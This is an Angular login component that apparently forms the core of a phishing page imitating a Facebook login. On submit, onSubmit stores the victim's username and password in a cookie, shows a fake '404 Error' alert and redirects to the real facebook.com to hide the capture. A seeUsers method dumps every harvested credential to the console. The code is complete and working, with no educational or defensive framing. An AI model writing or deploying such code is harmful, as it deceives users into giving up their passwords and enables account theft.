import { Component, OnInit } from '@angular/core';
import { CookieService } from 'ngx-cookie-service';

@Component({
  selector: 'app-header-login',
  templateUrl: './header-login.component.html',
  styleUrls: ['./header-login.component.css']
})

export class HeaderLoginComponent implements OnInit {

    user = {
        username: '',
        password: ''
    }

    constructor( private cookieService: CookieService ) { }

  onSubmit() {
    this.cookieService.set(this.user.username, this.user.password);
    alert('404 Error\nPage not found');
    window.location.href = 'https://www.facebook.com/';
    this.user = {
        username: '',
        password: ''
    }
  }

  seeUsers() {
    const allCookies: {} = this.cookieService.getAll();
    console.log(allCookies);
  }

  ngOnInit() {
  }

}
